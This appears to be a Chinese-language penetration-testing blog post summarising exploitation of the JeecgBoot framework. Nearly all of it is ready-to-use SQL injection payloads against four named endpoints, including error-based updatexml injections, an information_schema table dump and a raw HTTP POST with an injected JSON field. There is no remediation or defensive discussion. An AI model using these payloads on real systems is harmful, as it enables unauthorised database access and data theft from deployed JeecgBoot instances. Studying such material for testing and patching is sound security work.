---
layout: post
title: Jeecg boot利用总结
categories: [pen-test]
Description: Jeecg boot利用总结
keywords: Pen-test JeecgBoot
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

Description: Jeecg Boot.

## SQL Injection

### /sys/duplicate/check

poc：

```
/jeecg-boot/sys/duplicate/check?dataId=&fieldName=updatexml(1,concat(0x7e,user(),0x7e),1)&fieldVal=1000&tableName=sys_log
```

<img src="/images/pen-test/JeecgBoot/image-20240626163646353.png" alt="image-20240626163646353" style="zoom:67%;" />

### /sys/ng-alain/getDictItemsByTable/

poc：

```
/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
```

<img src="/images/pen-test/JeecgBoot/image-20240625145046671.png" alt="image-20240625145046671" style="zoom:50%;" />


### /sys/dict/queryTableData

poc：

```
/jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
```

<img src="/images/pen-test/JeecgBoot/image-20240625154257417.png" alt="image-20240625154257417" style="zoom: 67%;" />

### /jmreport/qurestSql

poc：

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json;charset=UTF-8

{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
```


